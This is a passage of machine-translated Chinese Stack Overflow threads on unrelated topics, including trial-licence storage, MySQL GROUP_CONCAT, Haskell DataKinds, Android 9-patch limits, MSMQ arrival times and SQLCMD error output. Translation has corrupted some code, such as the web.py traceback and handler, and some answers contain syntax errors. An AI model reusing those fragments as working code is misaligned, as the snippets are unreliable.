记录过去天数的最佳位置在哪里？在注册表中？有人不能只删除注册表项，然后再拥有完整的 x 天吗？

有没有更好的办法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:14:53.433

您存储在用户计算机上的任何内容都可能受到损害。
如果您对这件事很认真，那么您的“最佳”选择是拥有一个 Web 服务，您的应用程序在每次启动时都会调用它并传递某种形式的标识字符串。
（这也可能会受到影响）。

为了生成标识字符串，您可以查看[此问题](https://stackoverflow.com/questions/9546228/how-to-detect-the-original-mac-address-after-it-has-been-spoofed/9546552#9546552)和以下答案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:14:57.130

在本地机器上存储东西的位置并不重要，因为它总是可以被删除。

用户可以启动虚拟 PC 安装您的应用程序，然后在 28 天后回滚虚拟 PC 并再次安装。

一种选择是生成机器独有的密钥，然后使用 Web 服务进行验证。这不是完全的黑客证明，但它更好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:18:19.837

您可以将一些信息添加到与您的应用程序的试用版一起保存的任何文件中，这些信息对于该应用程序的特定版本是唯一的（可能是安装时的时间戳）。

当您的应用程序的试用版尝试打开文件时，它将检查此签名并确保它是使用同一实例创建的，否则拒绝打开文件。

这基本上消除了简单地重新安装应用程序并继续使用它的能力。

# php - 用于合并两个表以获得单个结果的 MySQL 查询

> ID：11243224
> 
> 赞同：2
> 
> 时间：2012-06-28T11:02:54.030
> 
> 标签：php, mysql

我有两个带有一个公共字段的表。这是这两个表结构的方式

表格1

```
+--ID--+--Title----+----others---+
| 123  | Title 1   | other values|
| 124  | Title 2   | other values|
| 125  | Title 3   | other values|
| 126  | Title 4   | other values|
+------+-----------+-------------+ 
```

表 2

```
+--ID--+--Tag ID--+----others---+
| 123  |   11     | other values|
| 123  |   12     | other values|
| 123  |   13     | other values|
| 123  |   14     | other values|
| 124  |   15     | other values|
| 124  |   16     | other values|
| 125  |   17     | other values|
| 126  |   18     | other values|
+------+----------+-------------+ 
```

我想显示文章`ID 123`有`4 tags`11、12、13 和 14，如下表所示

```
+--Article ID--+--Article Title--+--Tags--+--Tag IDs------+
|     123      |    Title 1      |    4   | 11, 12, 13, 14|
|     124      |    Title 2      |    2   |     15, 16    |
|     125      |    Title 3      |    1   |        17     |
|     126      |    Title 4      |    1   |        18     |
+--------------+-----------------+--------+---------------+ 
```

我对 PHP 和 MySQL 很陌生，并试图学习它。

有人请帮助我了解如何获得所需的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:09:41.657

这个查询应该可以工作（有一些调整）。

```
SELECT `ID` AS `t1`.`Article ID`, `t2`.`Title` AS `Article Title`, COUNT(`t2`.`ID`) AS `Tags`,
GROUP_CONCAT(`t2`.`ID`) AS `Tag IDs` FROM `Articles` AS `t1`
LEFT JOIN `Tags` AS `t2` ON `t1`.`ID` = `t2`.`ID`
GROUP BY `t1`.`ID` 
```

该功能还有几个其他选项`GROUP_CONCAT`，但默认值应该可以满足您的需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:30:57.547

```
SELECT t1.id AS 'Article ID',
t1.title AS 'Article Title', 
count( t2.tag_id ) AS 'Tags', 
GROUP_CONCAT( t2.Tag_Id order by t2.Tag_id ASC) AS `Tag IDs`
FROM table1 t1
JOIN table2 t2 ON ( t1.id = t2.id )
GROUP BY t1.id; 
```

希望这有效！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:07:20.267

正如评论中已经提到的那样，您应该使用 GROUP_CONCAT()。以下是一些示例和选项 - [http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:09:36.443

```
SELECT table1.*, 
       table2.tagidgroup 
FROM   table1 
       INNER JOIN (SELECT id, 
                          Group_concat(tagid SEPARATOR ','  ) AS tagidgroup 
                   FROM   table2 
                   GROUP  BY id) Table2 
               ON table1.id = Table2.id 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T11:06:07.403

合并表是通过使用`JOIN`(LEFT, RIGHT INNER) 关键字完成的。例如：

```
SELECT T1.*, T2.*, COUNT(T2.ID) AS TAG_COUNT, GROUP_CONCAT(T2.ID) AS TAG_IDS
FROM TABLE1 T1
LEFT OUTER JOIN TABLE2 T2 
ON T1.TAG_ID = T2.ID 
```

这种类型的连接结构表明，您有一个共同的字段，通过该字段进行连接本身。在您的表结构中，我假设第一个表 T1 是文章的表，第二个表是标签表。在这种情况下，您需要在 T1 表中有一个字段，该字段对应于 T2 中的字段，这很可能是 ID。

编辑：作为最后一步，您需要连接结果以实现所需的结构，正如许多答案所说 - 使用`GROUP_CONCAT()`功能。

# haskell - 使用 DataKind 在类型签名中绑定名称

> ID：11243227
> 
> 赞同：9
> 
> 时间：2012-06-28T11:02:58.717
> 
> 标签：haskell, syntax, type-systems

所以，我终于找到了一个可以使用新`DataKinds`扩展的任务（使用 ghc 7.4.1）。这是`Vec`我正在使用的：

```
data Nat = Z | S Nat deriving (Eq, Show)

data Vec :: Nat -> * -> * where
    Nil :: Vec Z a
    Cons :: a -> Vec n a -> Vec (S n) a 
```

现在，为方便起见，我想实现`fromList`. 简单的递归/折叠基本上没有问题——但我不知道如何给它正确的类型。作为参考，这是 Agda 版本：

```
fromList : ∀ {a} {A : Set a} → (xs : List A) → Vec A (List.length xs) 
```

我的 Haskell 方法，使用我在[这里](http://haskell.1045720.n5.nabble.com/Data-Kinds-and-superfluous-in-my-opinion-constraints-contexts-td5689436.html)看到的语法：

```
fromList :: (ls :: [a]) -> Vec (length ls) a
fromList [] = Nil 
fromList (x:xs) = Cons x (fromList xs) 
```

这给了我一个`parse error on input 'a'`. 我发现的语法是正确的，还是他们改变了它？我还在链接的代码中添加了一些更多的扩展，这也没有帮助（目前我有`GADTs, DataKinds, KindSignatures, TypeOperators, TypeFamilies, UndecidableInstances`）。

我的另一个怀疑是我不能绑定多态类型，但我对此进行了测试：

```
bla :: (n :: Nat) -> a -> Vec (S n) a
bla = undefined 
```

也失败了`Kind mis-match Expected kind 'ArgKind', but 'n' has kind 'Nat'`（不知道那是什么意思）。

任何人都可以帮助我提供一个工作版本`fromList`并澄清其他问题吗？不幸的是，`DataKinds`它的文档还没有很好，并且似乎假设每个使用它的人都具有深厚的类型理论知识。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-28T11:50:31.653

与 Agda 不同，Haskell 没有依赖类型，因此无法完全按照您的意愿行事。类型不能通过值参数化，因为 Haskell 强制在运行时和编译时之间进行阶段区分。概念上的工作方式`DataKinds`实际上非常简单：将数据类型**提升**为种类（类型的类型），并将数据构造函数提升为类型。

```
 fromList :: (ls :: [a]) -> Vec (length ls) a 
```

有几个问题：`(ls :: [a])`没有真正意义（至少当您只是通过提升伪造依赖类型时），并且`length`是类型变量而不是类型函数。你想说的是

```
 fromList :: [a] -> Vec ??? a 
```

`???`列表的长度在哪里。问题是您无法在编译时获取列表的长度......所以我们可以尝试

```
 fromList :: [a] -> Vec len a 
```

但这是错误的，因为它说`fromList`可以返回任意长度的列表。相反，我们想说的是

```
 fromList :: exists len. [a] -> Vec len a 
```

但 Haskell 不支持这一点。反而

```
 data VecAnyLength a where
     VecAnyLength :: Vec len a -> VecAnyLength a 

 cons a (VecAnyLength v) = VecAnyLength (Cons a v)

 fromList :: [a] -> VecAnyLength a
 fromList []     = VecAnyLength Nil
 fromList (x:xs) = cons x (fromList xs) 
```

您实际上可以使用`VecAnyLength`by 模式匹配，从而获得（本地）伪依赖类型的值。

相似地，

```
bla :: (n :: Nat) -> a -> Vec (S n) a 
```

不起作用，因为 Haskell 函数只能采用 kind 参数`*`。相反，您可以尝试

```
data HNat :: Nat -> * where
   Zero :: HNat Z
   Succ :: HNat n -> HNat (S n)

bla :: HNat n -> a -> Ven (S n) a 
```

这甚至是可以定义的

```
bla Zero a     = Cons a Nil
bla (Succ n) a = Cons a (bla n a) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-28T13:09:23.493

您可以在这里使用一些类型类魔法（更多信息请参见[HList](http://hackage.haskell.org/package/HList)）：

```
{-# LANGUAGE GADTs, KindSignatures, DataKinds, FlexibleInstances
  , NoMonomorphismRestriction, FlexibleContexts #-}

data Nat = Z | S Nat deriving (Eq, Show)

data Vec :: Nat -> * -> * where
  Nil :: Vec Z a
  Cons :: a -> Vec n a -> Vec (S n) a

instance Show (Vec Z a) where
  show Nil = "."

instance (Show a, Show (Vec m a)) => Show (Vec (S m) a) where
  show (Cons x xs) = show x ++ " " ++ show xs

class FromList m where
  fromList :: [a] -> Vec m a

instance FromList Z where
  fromList [] = Nil

instance FromList n => FromList (S n) where
  fromList (x:xs) = Cons x $ fromList xs

t5 = fromList [1, 2, 3, 4, 5] 
```

但这并不能真正解决问题：

```
> :t t5
t5 :: (Num a, FromList m) => Vec m a 
```

列表是在运行时形成的，它们的长度在编译时是未知的，因此编译器无法推断 的类型`t5`，必须明确指定：

```
*Main> t5

<interactive>:99:1:
    Ambiguous type variable `m0' in the constraint:
      (FromList m0) arising from a use of `t5'
    Probable fix: add a type signature that fixes these type variable(s)
    In the expression: t5
    In an equation for `it': it = t5
*Main> t5 :: Vec 'Z Int
*** Exception: /tmp/d.hs:20:3-19: Non-exhaustive patterns in function fromList

*Main> t5 :: Vec ('S ('S ('S 'Z))) Int
1 2 3 *** Exception: /tmp/d.hs:20:3-19: Non-exhaustive patterns in function fromList

*Main> t5 :: Vec ('S ('S ('S ('S ('S 'Z))))) Int
1 2 3 4 5 .
*Main> t5 :: Vec ('S ('S ('S ('S ('S ('S ('S 'Z))))))) Int
1 2 3 4 5 *** Exception: /tmp/d.hs:23:3-40: Non-exhaustive patterns in function fromList 
```

具有依赖类型的语言都有术语到类型的映射，类型也可以在运行时动态形成，所以不存在这个问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-01-10T10:39:24.237

在以前的答案之上：

*   价值水平，从`[a]`到`exist n. Vec n a`

*   value to typed value, from `[a]`to `Vec 5 a`，*您*必须在其中提供特定的`n`.

第一次变换的变体，就像

```
reify :: [a] -> (forall (n::Nat). Proxy n -> Vec n a -> w) -> w
reify [] k = k (Proxy @ 'Z) Nil
reify (x:xs) k = reify xs (\(_ :: Proxy n) v -> k (Proxy @ ('S n)) (Cons x v)) 
```

它仍然从一个值变为一个（静态）量化`[a]`的类型化值。这类似于方法，没有引入实际的数据类型来执行量化。`Vec n a``n``VecAnyLength`

这里`proxy`是明确的`n`as a `Nat`。它可以从代码中删除并`n`保持沉默，仅出现在 type`Vec n a`中，而不像在`Proxy @ ('S n)`.

# aop - 有人用过AspectMap吗？

> ID：11243237
> 
> 赞同：0
> 
> 时间：2012-06-28T11:03:35.640
> 
> 标签：aop, structuremap, aspect-ratio

我刚刚偶然发现了以下基于 StructureMap 构建的 AOP 框架，想知道是否有人有使用它的经验。

好用，有问题吗？

[http://www.chrissurfleet.co.uk/post/2012/06/27/AspectMap-Part-5-Aspect-Nesting-and-Prioritising.aspx](http://www.chrissurfleet.co.uk/post/2012/06/27/AspectMap-Part-5-Aspect-Nesting-and-Prioritising.aspx)

或者你能提出任何替代方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-22T07:59:13.937

我使用它，并且喜欢它，但后来我建造了它！它很好且易于上手，但不如某些替代品功能齐全。

好消息是您编写的代码通常是可重用的——所以如果您决定要使用其他东西，很容易将 aop 提供程序换掉。或者您可以轻松地从其他东西开始，然后转到 AspectMap ;)

如果您有任何问题，请随时通过博客给我发邮件，或者在这里提问

# javascript - JS Function undefined 当它显然是我正在使用的对象的原型时

> ID：11243238
> 
> 赞同：0
> 
> 时间：2012-06-28T11:03:36.260
> 
> 标签：javascript, google-maps-api-3

我正在使用带有 ClusterMarker 的 GoogleMaps JS API V3。到目前为止一切顺利，我有一张带有定制集群的工作地图。

我决定我需要一种方法来打开带有单击群集的一些信息的 infoWindow，包括一些锚定链接。

我在 SO 和 Google 上进行了一些搜索，并从这个[StackOverflow 答案](https://stackoverflow.com/a/4337808/1010632)中找到了一些类似的东西。

```
var infoWindow = new google.maps.InfoWindow();

google.maps.event.addListener(markerCluster, 'clusterclick', function (clickedCluster) {

    console.log(clickedCluster);

    var center = clickedCluster.getCenter();

    var latLng = new google.maps.LatLng(center);

    // infowindow.setContent("Info Window");
    // infowindow.setPosition(latLng);
    // infowindow.open(map);

}); 
```

在`console.log(clickedCluster)`我给出了一个具有 6 个方法和大量属性的 Cluster 对象。这些功能之一是`getCenter()`返回“已单击的群集图标的中心”。

当我取消注释此行时：`var center = clickedCluster.getCenter();`我收到一条错误消息，指出 getCenter() 不是函数。

谁能帮我解释一下我在这里做错了什么？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:27:13.147

所以问题的解决方案原来`clickedCluster`是作为数组返回的。下面的效果很好。

```
var infoWindow = new google.maps.InfoWindow();

google.maps.event.addListener(markerCluster, 'clusterclick', function (clickedCluster) {

    var center = clickedCluster[0].getCenter();
    var latLng = new google.maps.LatLng(center.lat(),center.lng());

    infoWindow.setContent(getDailyDeals(center.lat(),center.lng()));
    infoWindow.setPosition(latLng);
    infoWindow.open(map);
}); 
```

# android - Android 9补丁太多的列和行？

> ID：11243239
> 
> 赞同：2
> 
> 时间：2012-06-28T11:03:41.057
> 
> 标签：android, intellij-idea, nine-patch

我正在尝试使用 9-patch 作为 TextView 的背景，但它被视为普通图像文件。根据 9-Patch 工具和 Intellij IDEA Layout Preview，它应该可以正确拉伸。我也在使用其他 9 补丁，所以问题不可能是由于我的系统配置错误（例如在另一种情况下缺少库）。

到目前为止我所做的清单：

*   确保 9-patch 周边仅包含完全透明或纯黑色像素。
*   文件结尾是 *.9.png
*   在图像中指定和不指定填充的情况下尝试过

[这](http://imageshack.us/photo/my-images/96/timeline9.png/)是我想使用的图像。

刚才我看到 IDE 向我抛出这个“信息”：“错误：9-patch image ...\res\drawable\timeline.9.png 格式错误。9-patch 周边的行和列太多。”

我不知道的 9 补丁有什么限制吗？尝试搜索文档以获取有关此的更多信息，但没有成功。

提前谢谢，/我

PS：我知道可以通过删除段内的额外空间来优化图像，但仅此而已。一旦它按预期工作，我就计划这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-24T18:14:52.610

使用 2 个水平标记，我可以使用 12 个垂直标记（再添加一个垂直或水平标记会产生该错误）。所以我认为它计算交叉点（H * V），根据其他答案，最大值可能是 25。

* * *

**更新：**

基于安卓代码：

```
// Make sure the amount of rows and columns will fit in the number of
// colors we can use in the 9-patch format.
if (numRows * numCols > 0x7F) {
    errorMsg = "Too many rows and columns in 9-patch perimeter";
    goto getout;
} 
```

最大值为 0x7F = 127。

垂直标记被认为是一列，而水平标记是一排。因此，如果每个标记中有 5 个标记，则意味着您有**5 个可拉伸**列 + **6 个不可拉伸**列（标记之间的区域），因此总共 11 个垂直列，水平相同，因此 11 * 11 = 121 小于 127 所以你很好

在我的情况下，我有 12 个垂直（12+13 =25）和 2 个水平（2+3 =5），所以 25*5=125 仍然小于 127。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:11:46.743

您必须在 9-patch 上设置文本区域。在图片的底部和右侧定义它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T23:09:12.767

上次我检查：

最多可以使用 5 个填充标记。最多也可以使用 5 个缩放标记。

（更新：看起来有可能超过这个值。请参阅下面的附加评论。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-09T07:54:16.617

我在我的项目中测试了 18 个垂直标记和 6 个水平标记，返回了太多行和列的警告。然后我用了18个垂直标记和1个水平标记，很好:)，我想不会超过20个。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-08-15T15:55:59.373

我也达到了极限。针对 API 17 构建。我有一个网格，该网格在一天中的每个小时都有一列和 4 行。我玩了一下，我认为约束是补丁交叉点的数量。因此，如果我只有一个水平面片，我会在达到极限之前将其增加到大约 20 个垂直面片，但如果我有两个水平面片，我可能只能达到 10 个垂直面片。我尝试删除水平补丁，但随后出现错误“沿边缘未找到标记区域”。但是，如果我放弃调整高度并选择整个边缘作为水平面片，我可以添加所有 24 个垂直面片。我猜如果你让整个宽度或高度可调整大小，你可能会达到 40？只是基于我注意到的模式的有根据的猜测。

# asp.net - aspx 控件在 cs 文件中不可见

> ID：11243242
> 
> 赞同：0
> 
> 时间：2012-06-28T11:03:48.713
> 
> 标签：asp.net

我上传了 2 个页面并下载了同一个页面。我在该文件中添加了 2 个控件。但是我的 aspx 页面控件在我的 .cs 文件中不可见。当我编译它时，cs 文件发生错误（ddlbrand 在当前文件中不存在上下文）。我正在使用 vs 2005。我没有设计器文件。（只有 aspx 和 cs 文件）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:11:00.857

检查您的控件是否格式正确，是否存在问题，如果没有整个项目和解决方案文件，我认为您无法做到这一点。您需要使用 Visual Studio 在项目中进行更改。您在页面中添加的所有控件也会添加到设计器文件中。

Web 应用程序项目将 .CS 文件作为构建的一部分进行编译，并参考您预先构建的代码隐藏 DLL 即时编译 ASPX - 这就是为什么如果您更改后面的代码则必须重新编译的原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:12:12.217

没有设计器文件意味着您在 ASP.Net 网站项目中工作。

检查您的 aspx 标记，它必须缺少一些结束标记或一些重要参数，例如`runat="server"`

# java - 同一子网中具有多个地址的 UDP 服务器

> ID：11243247
> 
> 赞同：1
> 
> 时间：2012-06-28T11:03:59.590
> 
> 标签：java, udp

我有一个运行自定义 UDP 服务器的两节点集群。集群有一个公共 IP 地址，每个节点在同一子网中都有自己的私有 IP 地址。

UDP 服务器绑定到通配符地址，因此它可以接收来自公共或私有 IP 的数据报。问题是我无法控制发送回复的 IP 选择。无论出于何种原因，它似乎默认使用私有 IP。

现在，如果客户端只是向服务器发送命令并在同一端口上侦听回复，那不是问题。但是，一些客户端使用 connect() 调用，这限制了它们从最初发送命令的地址接收回复。如果他们向公共 IP 发送命令并在另一个 IP 上收到答案，他们就会忽略它。值得注意的例子是 Nagios 的 check_udp 插件。

服务器是用 Java 编写的，使用普通的 java.net.DatagramSocket。我在 DatagramPacket 类中看不到任何用于获取接收数据包的本地 IP 地址的方法。

我能做什么：

1.  重写 check_udp 以使用 bind() 而不是 connect()。这很痛苦，没有人保证将来不会有任何类似的客户。
2.  仅将服务器绑定到公共 IP。可能，但需要一些额外的集群设置才能仅在 IP 启动后启动服务器。它既会增加故障转移时间，也会引入不必要的服务器重启。现在，服务器总是在两个节点上运行，准备好接受请求。
3.  修改服务器以从收到请求的同一地址回复。这是最好的方法，但我需要弄清楚有问题的地址才能做到这一点。而且我还需要一种方法来从该地址发送回复 - 有没有办法在不关闭和重新打开套接字的情况下做到这一点？
4.  修改服务器不定时尝试绑定公网IP。可能，但麻烦。如何处理已经在套接字上活动的客户端？

我在这里缺少什么吗？这似乎不是一项非常艰巨的任务，但我似乎没有找到一个简单的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T22:24:42.187

我会修改（或包装到传输消息中）通过 UDP 套接字发送的消息，以包括发送者（身份）。

这与其他网络库（具体命名为 0MQ）处理此消息来自何处以及响应问题的整体方式相同。

# powershell - 监控 MSMQ 到达时间

> ID：11243251
> 
> 赞同：1
> 
> 时间：2012-06-28T11:04:21.657
> 
> 标签：powershell, msmq

我正在尝试编写一个脚本来监视服务器上的 MSMQ。我发现[了这个](https://stackoverflow.com/questions/2289464/the-number-of-messages-on-an-msmq-via-powershell)，它就像一个魅力，但我还需要知道到达的时间。

使用 Get-Member cmdlet 时，我会得到一个属性列表，但似乎没有一个能满足我的需要。

有谁知道如何获得到达时间？

/G

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-05T11:26:54.923

终于想通了。

```
[String]$cName = $Env:COMPUTERNAME
[Reflection.Assembly]::LoadWithPartialName("System.Messaging") | out-null
[System.Messaging.MessageQueue[]]$queues = [System.Messaging.MessageQueue]::GetPrivateQueuesByMachine($cName.ToLower())
Foreach ($queue in $queues) {
    $queue.MessageReadPropertyFilter.SetAll()
    try {
        [System.Messaging.Message]$message = $queue.Peek(10)
        Write-Host $queue.QueueName $message.ArrivedTime
    }
    catch {
        #Write-Host "Timeout"
    }
} 
```

诀窍是设置 MessageReadPropertyFilter。可以单独设置每个属性，但现在就可以了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T13:13:48.457

```
$qname = "<YourQueueNameHere>"

[Reflection.Assembly]::LoadWithPartialName("System.Messaging") | out-null

$q = new-object System.Messaging.MessageQueue($qname)

$msgs = $q.GetAllMessages()

foreach ( $msg in $msgs )
{
    Write-Host $msg.ArrivedTime
} 
```

`Message` [此处](http://msdn.microsoft.com/en-us/library/system.messaging.message%28v=vs.80%29.aspx)的文档。`Message.ArrivedTime` [此处](http://msdn.microsoft.com/en-US/library/system.messaging.message.arrivedtime%28v=vs.80%29)的文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-09-11T16:43:55.787

这对我有用。就我而言，脚本会计算过去一小时内收到了多少条消息。

```
$QueueArray = "MyQueue1.ERRORS", "MyQueue2.ERRORS";

foreach ($queue in $QueueArray)
{
    # Create each MSMQ object
    [System.Reflection.Assembly]::LoadWithPartialName("System.Messaging") | Out-Null
    $MessageQueue = New-Object System.Messaging.MessageQueue (".\private$\" + $queue)

    # Get the amount of the messages in the queue for the past hour.

    $MessageQueue.MessageReadPropertyFilter.SetAll()
    $PastHour = (Get-Date).AddHours(-1)
    $countFailedMessages = 0
    foreach ($message in $MessageQueue )
    {
        if ($PastHour -lt $message.ArrivedTime)
        {
            #Write-Host $message.ArrivedTime
            $countFailedMessages++
            #Write-Host $countFailedMessages
        }
    }
    Write-Host $queue `t $countFailedMessages "failed messages for the past hour"
} 
```

# sql - SQL Server 2005 - 优化存储过程

> ID：11243254
> 
> 赞同：0
> 
> 时间：2012-06-28T11:04:29.253
> 
> 标签：sql, sql-server-2005, stored-procedures

我在 SQL Server 2005 中有 2 个存储过程 (`sp1`和`sp2`) 具有相同的 sql 脚本（除了名称之外根本没有差异）。

当我尝试执行`sp1`时，它会在 0-1 秒内返回超过 3000 行。但是当我运行`sp2`它时，它将在 10 秒内返回这 3000 行。

想知道是否有任何工具/命令/任何东西可以设置特定的存储过程来优化？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:26:23.620

SQL Server 保存了如何执行代码的“计划”。

如果存储过程针对一小部分数据运行，它将针对小数据集进行优化。对于大型数据集，情况正好相反。

2008 年有一个不错的`OPTIMIZE FOR`功能，但在 2005 年，您仍然坚持使用`WITH RECOMPILE`. 这意味着它将在每次运行时重新编译，这在某些情况下是最优化的！

# python - web.py 有什么问题？SystemError：没有设置异常的错误返回

> ID：11243256
> 
> 赞同：1
> 
> 时间：2012-06-28T11:04:33.733
> 
> 标签：python, web.py

使用 web.py 上传文件时，会`" SystemError: error return without exception set"`引发异常。

这是回溯

```
    ...
      文件“../web/template.py”，第 882 行，在 __call__
       返回 BaseTemplate.__call__(self, *a, **kw)
      文件“../web/template.py”，第 809 行，在 __call__ 中
       返回 self.t(*a, **kw)
      文件“”，第 193 行，在 __template__ 中
      文件“../web/webapi.py”，第 276 行，输入
       out = rawinput(_method)
      文件“../web/webapi.py”，第 249 行，在 rawinput
       a = cgi.FieldStorage(fp=fp, environ=e, keep_blank_values=1)
      文件“../python2.7/cgi.py”，第 508 行，在 __init__
       self.read_multi（环境，keep_blank_values，strict_parsing）
      文件“../python2.7/cgi.py”，第 632 行，在 read_multi
       环境，keep_blank_values，strict_parsing）
      __init__ 中的文件“../python2.7/cgi.py”，第 510 行
       self.read_single()
      文件“../python2.7/cgi.py”，第 647 行，在 read_single 中
       self.read_lines()
      文件“../python2.7/cgi.py”，第 669 行，在 read_lines 中
       self.read_lines_to_outerboundary()
      文件“../python2.7/cgi.py”，第 697 行，在 read_lines_to_outerboundary
       线 = self.fp.readline(1

        """

       def POST（自我）：
        x = web.input(myfile= {})
        返回 x.myfile.file.read()

```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-14T23:36:35.917

不确定，但无论如何我都会切换到 WSGI，它更快且易于使用。运行内置网络服务器时是否出现该错误？

# java - 如何使用collecton框架java对向量列表进行排序

> ID：11243257
> 
> 赞同：2
> 
> 时间：2012-06-28T11:04:35.873
> 
> 标签：java, list, sorting, collections, vector

我正在尝试`Vector`使用 Java Collections 框架对列表进行排序。

这是我的代码...

```
public class RiverList {

    public static void main(String[] args) {
        Vector<River> rivers = new Vector<River>();
        //name length and discharge

        River river3 = new River("Nil", 6852, 2660);
        River river5 = new River("Amazonas", 6448, 209000);
        River river1 = new River("Rhein", 1233, 2330);
        River river4 = new River("Donau", 2857, 6700);
        River river2 = new River("Oker", 128, 12);

        rivers.add(river1);
        rivers.add(river2);
        rivers.add(river3);
        rivers.add(river4);
        rivers.add(river5);

        System.out.println(rivers);

        // sort the river after length with help class collection

        System.out.println(rivers);

        // sort the river after discharge with help class collection

        System.out.println(rivers);
    }
}

public class River {
    private int length;
    private int discharge;
    private String name; 

    public River(String name, int length, int discharge) {
        this.name = name;
        this.length = length;
        this.discharge = discharge;
    }

    // getters and setters
    ...

    public String toString() {
        return name + ", Length = " + length + ", discharge = " + discharge + "\n";
    }
} 
```

这是我所做的，但我被困在如何进一步进行......

```
public class RiverLengthComparator implements Comparator {
    public int compare(Object arg0, Object arg1) {
        return 0;
    }
}

public class RiverDischargeComparator implements Comparator {
    public int compare(Object o1, Object o2) {
        return 0;
    }
} 
```

输出应该是这样的（河流长度）......

```
("Nil", 6852, 2660);
("Amazonas", 6448, 209000);
("Donau", 2857, 6700);
("Rhein", 1233, 2330);
("Oker", 128, 12); 
```

而对于河流排放...

```
("Amazonas", 6448, 209000);
("Donau", 2857, 6700);
("Nil", 6852, 2660);
("Rhein", 1233, 2330);
("Oker", 128, 12); 
```

有人可以帮我解决这个问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T11:06:53.120

也许您的`compare`方法应该返回的不是`0`;) 考虑您想要实现的目标并阅读`Comparator`接口文档。

也许使用`Comparator<River>`而不是只是`Comparator`第一步。

最后，您可能希望与要使用`Collections.sort(rivers, new RiverLengthComparator());`的比较器一起使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:10:40.720

```
Collections.sort(vector); 
```

顺便说一句，您从这些打印语句中得到什么？

```
System.out.println(rivers);

//sort the river after length with help class colection

System.out.println(rivers);

//sort the river after discharge with help class colection

System.out.println(rivers); 
```

# sql - 如何让 SQLCMD 仅输出错误和警告

> ID：11243258
> 
> 赞同：11
> 
> 时间：2012-06-28T11:04:45.043
> 
> 标签：sql, sql-server, sql-server-2008-r2, sqlcmd

在执行 SQL 脚本文件时，如何让 SQLCMD 仅输出它遇到的任何错误或警告？

我基本上不希望输出基于信息的消息。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-06-28T12:20:36.783

`SQLCMD`通过向其传递参数来阻止返回非错误输出消息是不可能的。

但是，您可以做的是将错误消息重定向到`STDERR`，然后将所有其他消息重定向到`NUL`。

这是通过传递`-r`参数来完成的。来自[网上书籍](http://msdn.microsoft.com/en-us/library/ms162773%28v=sql.105%29.aspx)：

> -r[0| 1] 向标准错误发送消息
> 
> 将错误消息输出重定向到屏幕 (stderr)。如果不指定参数或指定 0，则仅重定向严重级别为 11 或更高的错误消息。如果指定 1，则重定向所有错误消息输出，包括 PRINT。如果使用 -o 则无效。默认情况下，消息被发送到标准输出。

根据您要显示的确切错误消息进行设置`-r`，但要显示所有错误消息输出，示例命令为：

```
sqlcmd -Q "select 1 as a; select 1/0 as b" -E -r1 1> NUL 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-28T23:43:16.023

除此之外，如果您将错误发送到文件中，我发现了这个[https://www.simple-talk.com/sql/sql-tools/the-sqlcmd-workbench/](https://www.simple-talk.com/sql/sql-tools/the-sqlcmd-workbench/)

我用过的。如果您省略设置 OUT，那么您只会创建一个错误日志。所以你有这样的命令：

```
sqlcmd -x -E -S MyServer -i C:\MySQLBatchToRun.sql 
```

然后在 MySQLBatchToRun.sql 中，像这样

```
USE MyDatabase
:Error C:\MyErrorLog.txt
:r C:\MySQLScript.sql
GO 
```

在 MySQLScript.sql 中，您可以运行实际的 SQL。这有点令人费解，但有效。我唯一的问题是它似乎创建了一个空的错误日志文件，即使没有错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-08T21:54:25.753

看起来打印语句使用 -r1 发送到 stderr，因此您可以使用它们与输出分开记录，如下所示：

```
sqlcmd -Q "print 'hello logfile';select 'Ted' as bro"  -r1 1> C:\output.txt 2> C:\logfile.txt 
```

这也适用于 -i 输入文件，例如： sqlcmd -i helloTed.sql -r1 1> C:\output.txt 2> C:\logfile.txt

helloTed.sql:

> 打印“你好日志文件”；
> 选择'Ted'作为兄弟

可能您可以使用 -Q 并插入 exec 包含打印的存储过程。

# mono - 在 Mono 中调试 SIGSEGV

> ID：11243260
> 
> 赞同：2
> 
> 时间：2012-06-28T11:04:48.633
> 
> 标签：mono

我正在为需要使用 AppleScript 的 OSX 编写单声道应用程序。我正在使用 [Monodevelop 源](http://github.com/mono/monodevelop/tree/master/main/src/addins/MacPlatform/MacInterop)中的 AppleScript 类，该类在大多数情况下都可以正常工作，但时不时会导致 SIGSEGV 并且我的程序崩溃。

